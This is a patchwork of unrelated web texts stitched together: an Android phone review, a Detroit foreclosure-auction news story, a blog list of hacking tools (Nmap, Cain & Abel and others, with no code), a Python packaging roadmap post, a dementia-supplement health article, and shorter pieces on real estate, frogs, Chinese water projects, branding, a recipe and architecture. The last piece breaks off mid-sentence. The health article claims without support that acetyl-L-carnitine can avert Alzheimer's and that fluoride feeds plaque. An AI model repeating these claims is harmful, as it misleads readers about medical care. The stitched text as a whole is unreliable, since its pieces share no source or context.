While the overall browser speed still is n't as snappy as the iPhone 3GS ( or even the Pre ) , it 's a step up from previous efforts , and when you factor in little touches like auto- prediction on URL entry , it 's eminently usable .
As we said , most of the alterations are under the hood -- not stuff that immediately jumps out at you , though there are some notable visual tweaks which bear mentioning .
Google has added some new fades and cross-application animations into 2.0 which makes Android seem a bit more contemporary .
Of course , older iterations of Android contained animations , but 2.0 seems far more polished to our eyes .
Additionally , icons and elements have been updated across the board to give the OS a more modern look , sadly there is much of this UI and its applications that remain unchanged -- and not for the better .
A few of the obvious spots include the music player , which is quite frankly a mess ; not only is the navigation poorly thought out , but the application is just straight - up ugly .
It 's not easy on the eyes , and not much fun to use either .
The same goes for the phone app -- the remnants of a hastily thrown together interface are plain here , and the functionality of the phone itself gave us some issues .
Often the screen was confused or unresponsive during calls , as if the hardware and software were n't communicating with each other properly .
It seems obvious to us that some portions of Android need a serious , ground - up reworking ... but they do n't get them here .
Another annoyance was the home screen -- unlike with HTC 's tweaks ( or even Motorola 's BLUR ) , you only get three screens for icons and widgets .
Furthermore , the DROID does n't come equipped with even the most basic widgets you see in most new builds , like weather .
The weird thing is that there is a weather app in the dock display , but no way to access the application in standard phone mode .
Additionally , some third - party ( and even some first - party ) software seems unable to deal with the DROID 's new resolution .
There are bitmaps that look upscaled and jagged , such as the attachment icon in Gmail .
The game Robo Defense seemed to play slower than it did on the Hero , which was a bit of a surprise , though it has been updated to support the new resolution .
None of these problems are show stoppers , but it points to a disconnect between where Google is at versus its developers .
There is catch - up to be played .
Also notable ( and perhaps a selling point for some ) is that the DROID is a Google Experience device , which should theoretically mean that it 's more likely to receive fast and frequent software updates than its skinned cousins like the CLIQ .
The Google Experience is sort of the " gold standard " Android showcase for the company , so to speak , and it's in Google 's best interest to keep it rock solid at all times -- and since there 's no third - party skin to revalidate after every Android version is released , the update process should go a heck of a lot smoother .
One thing to keep in mind : when it comes to media syncing , you 're in the same boat you were for previous versions of Android -- which means sideloading or additional desktop apps .
doubleTwist has just introduced DROID compatibility , though the experience leaves much to be desired .
In fact , after our tests , we 'd say you 're better off just mounting that SD card and dragging your content over .
DETROIT ( Reuters ) -
In a crowded ballroom next to a bankrupt casino , what remains of the Detroit property market was being picked over by speculators and mostly discarded .
Fall leaves blow past an empty home seen in a well kept neighborhood where the house is listed on the auction block during the Wayne County tax foreclosures auction of almost 9,000 properties in Detroit , Michigan , October 22 , 2009 .

After five hours of calling out a drumbeat of “ no bid ” for properties listed in an auction book as thick as a city phone directory , the energy of the county auctioneer began to flag .
“ OK , ” he said .
“ We only have 300 more pages to go . ”
There was tired laughter from investors ready to roll the dice on a city that has become a symbol of the collapse of the U.S. auto industry , pressures on the industrial middle - class and intractable problems for the urban poor .
On the auction block in Detroit : almost 9,000 homes and lots in various states of abandonment and decay from the tidy owner - occupied to the burned - out shell claimed by squatters .
Taken together , the properties seized by tax collectors for arrears and put up for sale last week represented an area the size of New York ’s Central Park .
Total vacant land in Detroit now occupies an area almost the size of Boston , according to a Detroit Free Press estimate .
The tax foreclosure auction by Wayne County authorities also stood as one of the most ambitious one - stop attempts to sell off urban property since the real - estate market collapse .
Despite a minimum bid of $ 500 , less than a fifth of the Detroit land was sold after four days .
The county had no estimate of how much was raised by the auction , a second attempt to sell property that had failed to find buyers for the full amount of back taxes in September .
The unsold parcels add to an expanding ghost town within the once - vibrant town known worldwide as the Motor City .
Critics say the poor showing at the auction underscores the limits of using a market - based system to clean up property tax problems .
They say the system has enriched a few but failed to deliver a way for Detroit to staunch its dwindling population and could worsen the vacancy crisis .
One proposed alternative would have officials take control of the tax foreclosure process through a land bank program of the kind being used to revitalize the nearby city of Flint .
The stakes in the debate are rising .
The number of Detroit properties in tax foreclosure has more than tripled since 2007 and seems certain to rise further .
The lots for sale last week represented arrears from only 2006 , well before the worst of the downturn for U.S. automakers .
“ We have to keep in mind that GM and Chrysler filed for bankruptcy this year , ” said Terrance Keith , chief deputy treasurer of Wayne County .
“ Some people are going to be totally tapped out next year . ”
Detroit , already stuck with a $ 300 million budget deficit , is responsible in the meantime for cutting the weeds and responding to fire calls for thousands more abandoned lots .
‘ WHY AM I COMPETING AGAINST A BANK ?’
Many potential homeowners that Detroit desperately needs said they felt penalized by the auction process .
They mostly found themselves outbid by deeper - pocketed investors from California and New York who were in a race to claim the auction book ’s relatively few livable properties .
Dozens of potential bidders , mostly local residents , were turned away on the first day of the auction by deputies after they failed to meet the morning deadline for registration .
Ross Wallace , a lieutenant in the U.S. Army , turned in his check for $ 500 and waited on the auction floor in full dress uniform for a chance to buy a Detroit house on the cheap .
Wallace , 27 , said he did not want to leave his fiancee and two children with a mortgage before shipping out to Iraq later this year .
“ I still have student loans and I ’m trying to be responsible .
I do n’t want to leave debt , ” he said .
Wallace waited for the auction to roll around to Detroit ’s Boston - Edison district , a once stately area that was home to boxing legend Joe Louis and Motown founder Berry Gordy .
But he was quickly outbid .
An unidentified investor at the front of the room who had scooped up several dozen properties took the home Wallace wanted for about $ 15,000 .
“ Why am I competing against a bank ? ” he said later .
“ It would be common sense to have a separate process for people who want to move back to the city or it ’s going to stay empty . ”
Nearby , a Dutch - born local woman , Riet Schumack , 54 , knitted patiently through the auction for a chance to bid on a lot in Brightmoor , one of the most blighted neighborhoods .
Schumack , who runs a community garden near her home that employs 14 neighborhood children , said she had been battling through a maze of bureaucracy for years to try to buy an abandoned lot nearby to expand and plant fruit trees .
She learned the lot had been taken back from its previous owner -- an absentee investor with more than 100 abandoned lots in Brightmoor -- only because of her constant calls to city and county officials , she said .
When officials told her she would have to wait for a fourth day to bid on the property , Schumack broke down into tears .
“ Anybody with a job is not able to sit here for days .
So you are left with the sharks , ” she said .
Opinions were divided on whether the investors buying lots and homes by the dozen were a sign of better times ahead .
“ They were n’t here two years ago .
So why are they here now ?
Unless , as speculators , they believe this is the bottom , ” said Keith of the Wayne County treasurer ’s office .
Bill Frank , a Detroit realtor trying to buy a small house for a just - married friend , found himself repeatedly outbid .
“ Speculators are often not good for a city and , from my experience , they are going to lose a fortune , ” he said .
“ But there are no easy answers .
It ’s a declining city . ”

Its been a while since I have posted about some hacking tools and with increasing number of emails asking me to do anarticle on it , I finally decided to cover it up .
Hacking tools are developed by some really good coders out there to ease out many complex tasks which have to be done manually and took painstakingly great deal of time and effort .
All these tools provided here are free of cost , are tried hands on and are being actively developed by community , and if not , their alternatives are provided .
To summarize it up , these are the 7 must have tools for every hacker out there .
1. I think everyone has heard of this one , it recently had a version 5 release .
Nmap ( Network Mapper ) is a free open source utility for network exploration or security auditing .
It was designed torapidly scan large networks , although it works fine against single hosts .
Many systems and network administrators also find it useful for tasks such as network inventory , managing service upgrade schedules , and monitoring host or service uptime .
Nmap uses raw IP packets in novel ways to determine what hosts are available on the network , what services ( application name and version ) those hosts are offering , what operating systems ( and OS versions ) they are running , what type of packet filters / firewalls are in use , and dozens of other characteristics .
It may be used to discover computers and services on a computer network , thus creating a " map " of the network .
Nmap runs on most types of computers and both console and graphical versions are available .
Nmap is free and open source .
Can be used by beginners ( - sT ) or by pros alike ( packet_trace ) .
A very versatile tool , once you fully understand the results .
Also , You can learn how to perform a simple Nmap scan by reading this article .
2 . Recently went closed source , but is still essentially free .
Works with a client - server framework .
Nessus is the worldsmost popular vulnerability scanner used in over 75,000 organizations world - wide .
Many of the worlds largest organizations are realizing significant cost savings by using Nessus to audit business - critical enterprise devices and applications .
3. If you have been reading my site , you might have read about it in a couple of articles .
Wireshark is a GTK +- basednetwork protocol analyzer , or sniffer , that lets you capture and interactively browse the contents of network frames .
The goal of the project is to create a commercial - quality analyzer for Unix and to give Wireshark features that are missing from closed - source sniffers .
Works great on both Linux and Windows ( with a GUI ) , easy to use and can reconstruct TCP / IP Streams ! . 4 . The swiss knife of hacking tools .. Cain & Abel is a password recovery tool for Microsoft Operating Systems .
It allows easy recovery of various kind of passwords by sniffing the network , cracking encrypted passwords using Dictionary , Brute - Force and Cryptanalysis attacks , recording VoIP conversations , decoding scrambled passwords , revealing password boxes , uncovering cached passwords and analyzing routing protocols .
The program does not exploit any software vulnerabilities or bugs that could not be fixed with little effort .
5 . Kismet is an 802.11 layer2 wireless network detector , sniffer , and intrusion detection system .
Kismet will work withany wireless card which supports raw monitoring ( rfmon ) mode , and can sniff 802.11 b , 802.11a , and 802.11g traffic .
A good wireless tool as long as your card supports rfmon6 .
Yes a decent wireless tool for Windows !
Sadly not as powerful as it ’s Linux counterparts , but it ’s easy to use and has anice interface , good for the basics of war - driving .
NetStumbler is a tool for Windows that allows you to detect Wireless Local Area Networks ( WLANs ) using 802.11 b , 802.11a and 802.11g .
It has many uses : 7. Powerful TCP port scanner , pinger , resolver .
SuperScan 4 is an update of the highly popular Windows port scanning tool , SuperScan .
If you need an alternative for nmap on Windows with a decent interface , I suggest you check this out , it ’s pretty nice .
Alternatively , you can try Angry IP Scanner which is a pretty good replacement for it .

[ Python - Dev ] Distutils and Distribute roadmap ( and some words on Virtualenv , Pip )
Here 's a quick summary of the main things that are going to happen in Distutils , and Distribute , and a few words on virtualenv and pip .
( there is much much more work going on , but I do n't want to drown people with details ) = Distutils = Distutils is a package manager and competes with OS package managers .
This is a good thing because , unless you are developing a library or an application that will only run one specific system that has its own packaging system like Debian , you will be able to reach much more people .
Of course the goal is to avoid making the work of a Debian packager ( or any other OS that has a package manager ) too hard .
In other words , re-packaging a Distutils - based project should be easy and Distutils should not get in their way ( or as less as possible ) .
But right now Distutils is incomplete in many ways and we are trying to fix 'em . ==
What 's installed ?
what 's the installation format ?
how to uninstall ? ==
First , it 's an incomplete package manager : you can install a distribution using it , but there 's no way to list installed distributions .
Worst , you can't uninstall a distribution .
PEP 376 resolves this , and once it 's finished , the goal is to include the APIs described there into Distutils itself and into the pkgutil module in stdlib .
Notice that there 's an implementation at http://bitbucket.org/tarek/pep376
that is kept up to date with PEP 376 so people can see what we are talking about .
Another problem that popped during the last years is the fact that , in the same site - packages , depending on the tool that was used to install a Distribution , and depending if this distribution uses Distutils or Setuptools , you can have different installation formats .
End-users end up with zipped eggs ( one file ) , unzipped eggs ( one self - contained format in a directory ) and regular Distutils ( packages and modules in site - packages ) .
And the Metadata are also located in many different places depending on the installation format used .
That can't be .
there 's no point to keep various installation format in the * same * site - packages directory .
PEP 376 also resolves this by describing a * unique * format that works for all .
Once this is finished , Distutils will implement it by changing the install command accordingly .
-
Work left to do in PEP 376 : restrict its scope to a disk - based , file - based site - packages .
- Goal : 2.7 / 3.2 == Dependencies ==
The other feature that makes a packaging system nice is dependencies .
e.g. a way to list in a distribution , the distributions it requires to run .
As a matter of fact , PEP 314 has introduced in the Metadata new fields for this purpose ( " Requires " , " Provides and " Obsoletes " ) .
So , you can write things like " Requires : lxml >= 2.2.1 " , meaning that your distribution requires lxml 2.2.1 or a newer version to run .
But this was just description fields and Distutils was not providing any feature based on these new fields .
In fact , no third - party tool either provided a feature based on those fields .
Setuptools provided " easy_install " a script that looks for the dependencies and install them , by querying the Python Package Index ( PyPI ) .
But this feature was implemented with its own metadata : you can add an " install_requires " option in the setup ( ) call in setup.py , and it will end up in a " requires.txt " file at installation time that is located alongside the Metadata for you distribution .
So the goal is to review PEP 314 and update the Metadata w.r.t. the setuptools feedback and community usage .
Once it 's done , Distutils will implement this new metadata version and promote its usage .
Promoting its usage means that Distutils will provide some APIs to work with these APIs , like a version comparison algorithm .
And while we 're at it , we need to work out some inconsistency with the " Author " and " Maintainer " fields .
( The latter does n't exists in the Metadata but exists on setup.py side ) .
-
Work left to do in PEP 314 : finish PEP 386 , finish the discussion on the " maintainer " field .
- Goal : 2.7 / 3.2 == Version comparison ==
Once you provide dependency fields in the metadata , you need to provide a version scheme : a way to compare two versions .
Distutils has two version comparison algorithms that are not used in its code and in only one place in the stdlib where it could be removed with no pain .
One version scheme is " strict " and one is " loose " .
And Setuptools has another one , which is more heuristic ( it will deal with any version string and compare it , wether it 's wrong or not ) .
PEP 386 goal is to describe a version scheme that can be used by all and if we can meet a consensus there , we can move on and add it as a reference in the update done in PEP 314 , besides the dependencies fields .
Then , in Distutils we can deprecate the existing version comparison algorithms and provide a new one based on PEP 386 and promote its usage .
One very important point : we will not force the community to use the scheme described in PEP 386 , but * there is * already a de-facto convention on version schemes at PyPI if you use Pip or easy_install , so let 's have a documented standard for this , and a reference implementation in Distutils .
There 's an implementation at http://bitbucket.org/tarek/distutilsversion that is kept up - to - date with PEP 386 .
- Work left to do in PEP 386 : another round with the community - Goal : 2.7 / 3.2 ==
The fate of setup.py , and static metadata == Setup.py is a CLI to create distribution , install them etc .
You can also use it to retrieve the metadata of a distribution .
For example you can call " python setup.py -- name " and the name will be displayed .
That 's fine .
That 's great for developers .
But there 's a major flaw : it 's Python code .
It 's a problem because , depending on the complexity of this file , an OS packager that just wants to get the metadata for the platform he 's working on , will run arbitrary code that mught do unwanted things ( or even that light not work )
So we are going to separate the metadata description from setup.py , in a static configuration file , that can be open and read by anyone without running any code .
The only problem with this is the fact that some metadata fields might depend on the execution environment .
For instance , once " Requires " is re-defined and re-introduced via PEP 314 , we will have cases where " pywin32 " will be a dependency to have only on win32 systems .
So we 've worked on that lately in Distutils - SIG and came up with a micro-language , based on a ConfigParser file , that allows writing metadata fields that depends on sys.
platform etc .
I wo n't detail the syntax here but the idea is that the interpretation of this file can be done with a vanilla Python without running arbitrary code .
In other words : we will be able to get the metadata for a distribution without having to install it or to run any setup.py command .
One use case is the ability to list all dependencies a distribution requires for a given platform , just by querying PyPI .
So I am adding this in Distutils for 2.7 .
Of course setup.py stays , and this is backward compatible .
-
Work left to do : publish the final syntax , and do the implementation - Goal : 2.7 / 3.2 ==
The fate of bdist_* commands == During last Pycon summit we said that we would remove commands like bdist_rpm because Python is unable , due to its release cycle , to do a good work there .
Here 's an example : I have from time to time cryptic issues in the issue tracker from people from Fedora ( or any rpm-based system ) , and I have all the pain in the world for these very specific problems to do the proper fix unless some RPM expert helps around .
And by the time it 's detected then fixed , it can be year (s ) before it 's available on their side .
That 's why , depending on the communities , commands like bdist_rpm are just totally ignored , and OS packager have their own tools .
So the best way to handle this is to ask these communities to build their own tool and to encourage them to use Distutils as a basis for that .
This does not concern bdist_* commands for win32 because those are very stable and do n't change too much :
Windows does n't have a package manager that would require these commands to evolve with it .
Anyways , when we said that we would remove bdist_rpm , this was very controversial because some people use it and love it .
So what is going to happen is a status - quo : no bdist_ * command will be removed but no new bdist_* command wil be added .
That 's why I 've encouraged Andrew and Garry , that are working on a bdist_deb command , to keep it in the " stdeb " project , and eventually we will refer to it in the Distutils documentation if this bdist_deb comply with Distutils standard .
It does n't right now because it uses a custom version of the Distribution class ( through Setuptools ) that does n't behave like Distutils ' one anymore .
For Distutils , I 'll add some documentation explaining this , and a section that will list community - driven commands .
-
Work left to do : write the documentation - Goal : 2.7 / 3.2 = Distribute =
I wo n't explain here again why we have forked , I think it 's obvious to anyone here now .
I 'll rather explain what we are planning in Distribute and how it will interact with Distutils .
Distribute has two branches : - 0.6.x : provides a Setuptools - 0.6c9 compatible version - 0.7.x : will provide a refactoring == 0.6.x == Not " much " is going to happen here , we want this branch to be helpful to the community * today * by addressing the 40 - or - so bugs that were found in Setuptools and never fixed .
This is eventually happen soon because its development is fast : there are up to 5 commiters that are working on it very often ( and the number grows weekly . )
The biggest issue with this branch is that it is providing the same packages and modules setuptools does , and this requires some bootstrapping work where we make sure once Distribute is installed , all Distribution that requires Setuptools will continue to work .
This is done by faking the metadata of Setuptools 0.6c9 .
That 's the only way we found to do this .
There 's one major thing though : thanks to the work of Lennart , Alex , Martin , this branch supports Python 3 , which is great to have to speed up Py3 adoption .
The goal of the 0.6.x is to remove as much bugs as we can , and try if possible to remove the patches done on Distutils .
We will support 0.6.x maintenance for years and we will promote its usage everywhere instead of Setuptools .
Some new commands are added there , when they are helpful and do n't interact with the rest .
I am thinking about " upload_docs " that let you upload documentation to PyPI .
The goal is to move it to Distutils at some point , if the documentation feature of PyPI stays and starts to be used .
== 0.7.x ==
We 've started to refactor Distribute with this roadmap in mind ( and no , as someone said , it 's not vaporware , we 've done a lot already ) - 0.7.x can be installed and used with 0.6.x - easy_install is going to be deprecated !
use Pip !
- the version system will be deprecated , in favor of the one in Distutils - no more Distutils monkey - patch that happens once you use the code ( things like ' from distutils import cmd ; cmd. Command = CustomCommand ' ) - no more custom site .py ( that is : if something misses in Python 's site .
py we 'll add it there instead of patching it ) - no more namespaced packages system , if PEP 381 ( namespaces package support ) makes it to 2.7 - The code is splitted in many packages and might be distributed under several distributions .
- distribute .
resources : that 's the old pkg_resources , but reorganized in clean , pep - 8 modules .
This package will only contain the query APIs and will focus on being PEP 376 compatible .
We will promote its usage and see if Pip wants to use it as a basis .
And maybe PyPM once it 's open source ? ( < hint > < hint > ) .
It will probably shrink a lot though , once the stdlib provides PEP 376 support .
- distribute.
entrypoints : that 's the old pkg_resources entry points system , but on its own .
it uses distribute .
resources - distribute.index : that 's package_index and a few other things .
everything required to interact with PyPI .
We will promote its usage and see if Pip wants to use it as a basis .
- distribute.core ( might be renamed to main ) : that 's everything else , and uses the other packages .
Goal : A first release before ( or when ) Python 2.7 / 3.2 is out .
= Virtualenv and the multiple version support in Distribute = ( I am not saying " We " here because this part was not discussed yet with everyone )
Virtualenv allows you to create an isolated environment to install some distribution without polluting the main site - packages , a bit like a user site - packages .
My opinion is that this tool exists only because Python does n't support the installation of multiple versions for the same distributions .
But if PEP 376 and PEP 386 support are added in Python , we 're not far from being able to provide multiple version support with the help of importlib .
Setuptools provided a multiple version support but I do n't like its implementation and the way its works .
I would like to create a new site - packages format that can contains several versions of the same distribution , and : - a special import system using importlib that would automatically pick the latest version , thanks to PEP 376 .
- an API to force at runtime a specific version ( that would be located at the beginning of all imports , like __future__ ) - a layout that is compatible with the way OS packagers works with python packages Goal : a prototype asap ( one was started under the " VSP " name ( virtual site - packages ) but not finished yet )

About the author
( NewsTarget ) Dementia is associated with aging , and the most common form of dementia is Alzheimer's .
According to the Alzheimer 's Association , 26 million are afflicted with Alzheimer 's world wide .
With all the toxins in our environment and food , it 's vital that we obtain dietary information to minimize all forms of dementia .
Northwestern University researchers discovered that the amyloid plaque in the brains of two cadaver study groups , those who had unusually keen minds and others who were " normal " for their age , was virtually the same .
But the extremely keen minded oldsters had significantly fewer tau protein brain tangles .
Tau protein are thread like strands .
Different stressors and exciters can cause them to tangle and swell up the brain cells .
Conversely , amyloid plaque , commonly considered the sole source of Alzheimer 's , tends to form outside the brain cells , thus impeding communication between cells .
Certified Clinical Nutritionist Byron Richards says , " Carnosine levels decline with age partly due to general increased antioxidant demand in an effort to try and protect the aging brain . "
This increased antioxidant demand depletes carnosine , especially in regions of the brain associated with memory problems ( Alzheimer 's ) and tremors ( Parkinson's ) .
So he recommends supplementing with Carnosine as one ages .
Regarding brain tangles , an animal study concluded that Acetyl - L - Carnitine was the choice for preventing those protein strands from tangling after stress .
The researchers injected chemicals into the nerves that overly excite tau proteins and cause brain tangles to mimic the key aspect of Alzheimer 's .
They found that by giving acetyl - l - carnitine to animals for two weeks prior to injecting those nerve damaging chemicals , the essential tau protein cells remained untangled .
Thus the consequences of Alzheimer 's in humans could be averted with acetyl - l - carnitine supplementation .
L- Carnitine has been used by athletes and body builders to increase energy production and burn body fat successfully for sometime .
It has also demonstrated a resurgence in muscle strength , testosterone , and endurance for the elderly .
More significantly , taken in the form of acetyl - l - carnitine it appears to stave off Alzheimer 's and other forms of dementia .
Do n't confuse this with the closely related l-carnitine .
Byron Richards and Dietitian Gale Malesky highly recommend both canosine and acetyl - l - carnitine supplementation for preventing many forms of dementia .
As always , begin by avoiding the poisons .
Excitotoxins MSG and aspartame added to processed foods do just that - excite both brain and nerve cells to the point of destruction and probable brain tangles .
Fluoride , aluminum , and heavy metals contribute to amyloid plaque formations .
Learn all the names used to disguise MSG and other food additives .
Even better , simply consume whole organic foods while avoiding all processed foods , including the ones in health food stores !
It appears that meats and dairy products are the best sources of both carnosine and acetyl - l - carnitine .
A vegetarian 's body is capable of manufacturing these .
But that ability declines with age .
So to avoid meat or dairy , the aforementioned supplements could be added .
Heavy green tea drinking helps alleviate the mental stress that contributes to mental deterioration .
Gingo assists mental clarity .
Curcumin minimizes or eliminates plaque and inflammation .
Vitamin B12 with folic acid and B6 are good for brain health too .
Hosphatidyl serine supplements with inositol , choline and the DHA from fish oil combined are especially useful for those already experiencing age related memory problems , according to Gayle Malesky .
Paul Fassa is dedicated to warning others about the current corruption of food and medicine and guiding others toward a direction for better health with no restrictions on health freedom .

MOUNT KISCO , N.Y .
Lord knows it ’s rough out there in the housing market .
Still , you had to feel bad for Patty Bonadies , digging with a spoon in the rocky soil in front of the new three - story colonial for sale at 7 Old Roaring Brook Road in search of the tiny statue of St. Joseph she had buried in hopes of helping the house sell .
“ I should have brought a bigger spoon , ” she said .
She wanted to move the statue , which she had planted near the front door in May , to a perhaps more propitious spot .
Her late mother - in - law ’s house in Dobbs Ferry , N.Y. , is for sale , and she plans to plant a statue there , too .
“ You have to believe , ” she said .
“ In this market , you ’re looking for any help you can get . ”
Mrs. Bonadies , a real estate agent for three years , is Roman Catholic , but St. Joseph , who is said to look after homes , families and carpenters , among many other things , is n’t just for Catholics anymore .
With the housing market still dismal , the Catholic tradition of planting a statue of him as a way to help a house sell is going like gangbusters online , in stores selling religious goods and elsewhere  even if home sales are not .
“ In the past , we ’ve seen some upticks in sales of the kits whenever there ’s a sign that the housing market is on the skids , ” said Nicholas Cole , director of marketing for the Catholic Company , based in Charlotte , N.C. , which sells religious items online and through catalogs .
“ But the sales of the product have been really strong for the last two years .
We saw a really big spike last year , and they ’re still really selling .
I do n’t want to say ‘ desperate ’ is the right word , but I think it ’s selling to people across the board , not just Catholics . ”
The fungus now decimating frog populations around the world does its damage by impairing the animals ’ ability to absorb electrolytes through their skin .
This discovery may eventually lead to treatments that make the disease less lethal .
Biologists now generally agree that the fungal disease known as chytridiomycosis is responsible for the worldwide die - off of frogs that has caused a conservation crisis in recent years .
However , the fungus affects only the outer layers of the skin , leaving few clues to why it is so lethal .
But now Jamie Voyles of James Cook University in Townsville , Australia , and colleagues have an answer .
In diseased frogs , the skin ’s ability to take up sodium and potassium ions from the water decreases by more than 50 per cent , they found .
As a result , the concentration of these two ions in the frogs ’ blood fell by 20 and 50 per cent , respectively .
This ion loss – similar to the hyponatraemia that a human athlete might experience from drinking too much water too fast – eventually leads to cardiac arrest and death .
The researchers found they could delay death by giving diseased frogs an oral electrolyte - replacement solution – a sort of froggy Gatorade .
Fungal damage to the skin was too extensive for this to prevent death altogether , the study represents a first step toward finding an effective treatment for the disease , Voyles says .

The Danjiangkou dam is being enlarged for the mega - project China has begun to resettle 330,000 people to make way for a project to divert water from the south of the country to the north , state media say .
People in Henan and Hubei provinces are being moved out of the way of a canal from the Yangtze River to Beijing , Xinhua news agency said .
When completed , three routes will carry water from southern , central and western China to the arid north .
The $ 62bn ( £ 42 bn ) project is already four years behind schedule .
Water is expected to flow from the Yangtze and its tributaries to Beijing in 2014 along the central route .
Environmental concerns
People are being moved from their homes near the Danjiangkou reservoir , which is being enlarged and where a sluice is being built to divert water from the Yangtze and its tributaries .
FUTURE WATER STRESS
Interactive map :
Water stress in a changing world The Henan provincial government has approved settlement areas for the people being relocated .
Families are being allocated homes and farmland in newly - built villages , and annual subsidies of about $ 88 ( £ 54 ) , Xinhua said .
But there have been complaints that farmers are being offered less than half the land they currently use .
Critics have also said the massive project will cause environmental damage and still not satisfy northern China 's water demands , even when the three routes are completed .
To solve that problem , experts say , the region must conserve what little water it has .
The water diversion project involves China 's second - largest resettlement scheme , following the relocation of 1.3 million people to make way for the Three Gorges Dam .

Building your business through brand extension
During tough market conditions , brand or product line extensions might just be the best way for your business to stay healthy , especially if they ’re not something you spend much time thinking about .
When done right , brand extensions can either be a positive way to build stronger and more profitable relationships with your clients and customers .
When done poorly , brand extensions can be expensive experiments that drain cash flow and confuse your market ’s understanding of your business ’ proposition .
Loyalty and Trust
One of the greatest benefits of building a strong brand is the loyalty and trust that you build with your clients and customers .
As purchasers of products and services , people will always prefer to deal with someone they have a trusted relationship with , over forming a new relationship without established trust .
Adding a product or service offering to your brand that is relevant to the needs of your customer can not only have a positive effect on revenue , but also further enhance the relationships your customers have with your brand .
Real estate agents extends themselves
Melbourne real estate agent ; Marshall
White recently developed a value - add service for clients preparing their homes for sale – huge removal and self storage trailers .
Parked out front of a house sporting an ‘ upcoming auction ’ sign , the over - sized blue and gold trailer not only drew attention to the house on behalf of the vendor , but also provided a high traffic billboard – all for the benefit of Marshall White .
We recently sold our house through Marshall White , hiring an off - site self - storage unit in the process .
We not only invested a reasonable sum in doing that , but also hours of weekend time carting our much loved ( if little needed ) household junk over to the storage unit .
During the four months we had the unit , we visited many times to retrieve the odd needed item , and then at the end of the process had to cart it all back again .
This whole process would have been made immensely more simple by the availability of a giant , secure trailer .
Which leads me to the six golden rules of brand extension .
Golden Rule No.1 – Brand Alignment
The universal mistake common to almost all failed Brand extensions ; the new product or service did not relate directly and positively to the business ’ brand , it ’s proposition , what it stood for in the minds of its market .
When aligned with the values and proposition of the brand , the product extension is half way to being successful .
Golden Rule No.2 – Understand your Market
What would your customers and clients most value ?
What is it you could bring to their lives that would make the greatest positive impact ?
The answers to this question most usually lie in the behaviors of your clients and customers either up - stream or down - stream from their interaction with you and your business .
By observing , discussing and understanding how and why your customers behave in the way they do will provide all the gfround you need for identifying new product extension ideas .
Golden Rule N0.3 – Research
What are your competitors doing ?
What are your peers in other markets locally and abroad doing ?
What are the strongest trends impacting the lives of your customers .
By spending time on the internet investigating , you may just short - cut the whole process , at the worst you ’ll be doing some useful competitor analysis .
Golden Rule No.4 – Brainstorm for Ideas
Get your team together ( include everyone with an imagination ) , play back for them the research you have done , your target market profile and their behaviors .
Throw the subject open for discussion and white - board the ideas .
The more ideas the better , do n’t discount anything at this stage of the process – many good ideas were binned before their potential was identified .
Golden Rule No.5 – R&D
Assess the ideas for brand alignment , cost to execute , and brand promotion and commercial potential .
List the best three ideas .
If you have a large enough team , develop and execute all three giving one person responsibility for each .
If your team is smaller , focus on the best idea only and develop that to execution before considering your other ideas .
Consider these brand extensions as products that you can individualise and package - up to own .
Golden Rule No.6 – Market like Crazy
Market your brand extensions to guess who ?
– your current clients and customers , old clients and customers and potential clients and customers .
Add the new product or service to your existing marketing and advertising campaigns .
The undeniable value of great brand extension
Had Marshall
White have had this brand extension when we were making our decision about which agent to engage to sell out house , they would have had an even greater point of differentiation .
Just as importantly , they would also have pocketed the additional revenue that we invested in another business .
If you ’d like to get together with us to discuss ideas for extending the product and service of your brand , give us a shout .

Bacon potato salad Total time : About 40 minutes Servings : 4 to 6 Note : Adapted from Cole’s .
This recipe calls for smoked salt , available at many well - stocked and specialty markets .
An equal amount of kosher salt can be substituted for the smoked salt .
1 pound Yukon gold potatoes 3 strips bacon , coarsely chopped 1 / 4 cup plus 3 tablespoons mayonnaise , or more to taste 1 heaping tablespoon Dijon mustard , or more to taste 1 heaping tablespoon cider vinegar , or more to taste 1/ 4 teaspoon smoked salt 1 / 4 teaspoon kosher salt 1/8 teaspoon freshly ground black pepper 2 green onions , chopped 1 heaping tablespoon chopped fresh thyme 1 heaping tablespoon chopped fresh parsley 1 .
In a medium saucepan , add the potatoes and enough water to cover the potatoes by 1 inch .
Bring the pan to a simmer and cook until the potatoes are tender ( a paring knife should easily pierce the potato ) , about 25 minutes .
Remove from the heat , drain the potatoes and set aside until cool enough to handle .
2 . While the potatoes are cooking , fry the bacon in a medium skillet over medium heat until crisp , 8 to 10 minutes .
Remove from heat and drain the bacon onto a paper towel - lined plate .
Save 1 tablespoon bacon grease and set aside in a warm place ( discard the rest , or save for another use ) .
3 . In a small bowl , whisk together the mayonnaise , mustard , cider vinegar , smoked salt , kosher salt and pepper .
Taste and adjust the dressing as desired .
Set aside .
4 . Dice the potatoes into half - inch cubes and place in a large bowl .
Stir in the warm bacon fat until combined .
Fold in the dressing , bacon , green onions , thyme and parsley .
Taste the salad and adjust the seasoning if desired .
Cover and chill the potato salad before serving .

Long gone are the days bacon was just something that made you go “ om nom nom ” as you shoved it down your throat , now it ’s used to create virtually anything , even a night lamp .
I found a set of photos on Flickr , that showed the process of creating a perfectly usable and edible bacon lamp , and thought I just had to post here for you guys to see .
Iwonder if the lightbulb actually cooks the bacon as you use the nightlamp to read a book or something .
After you finish , you can just eat the bacon as a late snack and go to sleep a happy man .
How awesome is that ?!?
The results could have been worse .
The enormous steel canopy of Norman Foster ’s opera house has a pleasant , almost affectionate relationship with the low Cubist forms of Brad Cloepfil ’s performing and visual arts high school next door .
Rem Koolhaas ’s and Joshua Prince - Ramus ’s cool and somber aluminum - clad theater tower across the street , by contrast , is an aggressive rejection of the visual noise that many have come to expect when a star architect is hired to design a cultural building .
What ’s more , the new buildings sit comfortably alongside older structures like I.M.
Pei ’s concert hall and Edward Larrabee Barnes ’s art museum , extending the conversation across generations as well as contrasting architectural philosophies .
What the planners could not easily overcome , however , was the scale of destruction , and the resistance many felt toward breaking down old barriers .
Nearly 30 years after the plan was unveiled , most of the commercial lots remain empty .
And the divisions that continue to separate this enclave of high culture from the nearby communities remain deep .
No project better illustrates these tensions than Los Angeles ’ downtown arts district , which was conceived in the 1950s as an elite cultural citadel fortified against the surrounding Latino neighborhoods .
To build it , civic leaders approved the bulldozing of a sprawling , decayed residential neighborhood of two - story Victorian houses .
The Music Center , completed in the 1960s , was isolated on a concrete base in the style of Lincoln Center .
The Harbor Freeway , partly built around the same time , cut the site off from the city to the west .
The area ’s isolation was further reinforced in the 1980s with the construction of sterile corporate towers and plazas , which formed a barrier against the Latino communities that occupied the old historic corridor nearby .
Walt Disney Concert
Hall , completed six years ago , was the first sincere effort to reverse this trend .
Frank
